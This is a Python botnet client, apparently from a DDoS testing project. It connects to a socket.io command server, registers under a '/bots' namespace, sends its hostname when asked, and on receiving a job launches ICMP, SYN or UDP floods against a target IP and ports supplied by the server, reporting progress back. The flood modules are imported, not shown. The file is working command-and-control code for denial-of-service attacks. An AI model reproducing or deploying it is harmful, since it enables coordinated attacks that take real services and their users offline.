import socketio
import asyncio
import time
from constants import authToken, clientType, version,AttackTypes
import socket
from concurrent.futures import ThreadPoolExecutor
from lib.ThreadPool import ThreadPool
from lib.icmp_flood import IcmpFlood
from lib.syn_flood import SynFlood
from lib.udp_flood import UdpFlood
import threading
# TODO Crete the worker pool
ThreadPool.executor =  ThreadPoolExecutor(15)
# asyncio
sio = socketio.Client(
    logger=True,
    reconnection_delay_max=10)


@sio.event
def connect():
    print("I'm connected!")


@sio.event
def connect_error(data):
    print("The connection failed! " + data)


@sio.event
def disconnect():
    print("I'm disconnected!")
# @sio.event
# def on_meta_requested():
#     print("[ Client meta was requested]")
#     return {"name": socket.gethostname(), "clientType": clientType, "version": version}


class BotsNamespace(socketio.ClientNamespace):
    # ! Omit on_ : why even exist
    def on_meta_requested(self):
        print("[ Client meta was requested]")
        return {"name": socket.gethostname(), "clientType": clientType, "version": version}
    def on_job_arrival(self,data):
        print("a new job arrived")
        id = data.get("id")
        attackDetails = data.get("attackDetails")
        no_of_packets = attackDetails.get("no_of_packets")
        target_ip = attackDetails.get("target_ip")
        dport = attackDetails.get("dport")
        sport = attackDetails.get("sport")
        attackType = attackDetails.get("attackType")
        print("Number of packets assigned for this client is "+ str(no_of_packets))
        def notify_le_server(progress):
            print("progress update from callback is here " + str(progress))
            #! Dirty way to deal with send() requests being blocked while this gets sent
            threading.Thread(target=(lambda: self.emit("on_progress_update",{"id":id,"progress":progress})),daemon=True).start()
            
        print(str(data))
        # ! ICMP
        if(attackType == AttackTypes.ICMP):
            task = IcmpFlood(id,notify_le_server)
            task.startTask(no_of_packets=no_of_packets,target_ip=target_ip,)

        # ! SYN
        elif(attackType == AttackTypes.SYN):
            task = SynFlood(id,notify_le_server)
            task.startTask(no_of_packets=no_of_packets,target_ip=target_ip,dport=dport,sport=sport,)

        # ! UDP
        elif(attackType == AttackTypes.UDP):
            task = UdpFlood(id,notify_le_server)
            task.startTask(no_of_packets=no_of_packets,target_ip=target_ip,dport=dport,sport=sport,)

sio.register_namespace(BotsNamespace('/bots'))

# baseUrl = "https://ddos-test-itsec.herokuapp.com/"

baseUrl = "http://localhost:5000"

# http://localhost:5000
def main():
    while True:
        try:
            sio.connect(baseUrl, auth={
                "token": authToken,
            })
            print('my sid is', sio.sid)
            sio.wait()
        # except socketio.exceptions.ConnectionError:
        except Exception as e:
            print("Connection Failed, Retrying.." + str(e))
            # Retry everysecond
            time.sleep(1)
if __name__ == '__main__':
    main()
